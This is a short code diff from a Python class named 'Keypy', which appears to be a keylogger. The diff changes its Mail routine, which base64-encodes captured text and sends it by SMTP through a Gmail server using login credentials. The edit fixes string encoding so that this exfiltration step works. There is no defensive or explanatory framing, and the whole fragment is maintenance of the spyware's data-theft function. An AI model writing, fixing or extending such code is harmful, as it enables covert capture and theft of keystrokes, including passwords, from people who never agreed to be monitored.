@@ -32,7 +32,7 @@ class Keypy:
         self.count = count
         self.t = ""
     def Mail(self):
-        data = base64.b64encode(self.t)
+        data = base64.b64encode(self.t.encode())
         server = smtplib.SMTP('smpt.gmail.com:587')
         server.starttls()
         server.login("email@em.com", "password")
